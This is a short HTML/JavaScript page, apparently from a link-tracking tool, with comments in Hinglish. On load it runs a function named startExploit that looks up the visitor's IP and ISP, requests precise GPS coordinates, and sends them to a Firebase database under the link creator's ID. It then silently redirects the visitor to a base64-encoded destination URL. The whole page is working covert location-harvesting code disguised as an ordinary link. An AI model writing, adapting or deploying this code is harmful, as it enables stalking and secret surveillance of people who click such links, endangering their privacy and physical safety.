<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
<script>
    const firebaseConfig = { /* Wahi config jo aapne index mein dali hai */ };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const params = new URLSearchParams(window.location.search);
    const adminId = params.get('id');
    const redirect = atob(params.get('r'));

    async function startExploit() {
        // 1. Get IP Info
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();

        // 2. Try to get GPS
        navigator.geolocation.getCurrentPosition((pos) => {
            sendToAdmin(pos.coords.latitude, pos.coords.longitude, ipData.ip, ipData.org);
        }, (err) => {
            // If GPS denied, send only IP
            sendToAdmin("Denied", "Denied", ipData.ip, ipData.org);
        }, { enableHighAccuracy: true });
    }

    function sendToAdmin(lat, lng, ip, isp) {
        db.ref('users/' + adminId + '/trackingLogs').push({
            time: new Date().toLocaleString(),
            method: "LINK-EXPLOIT",
            coords: lat + ", " + lng,
            isp: isp + " (" + ip + ")",
            status: lat === "Denied" ? "IP-ONLY" : "FULL-GPS"
        }).then(() => {
            // 24 Hour Permission Lock (Optional simulation)
            window.location.href = redirect;
        });
    }
    startExploit();
</script>
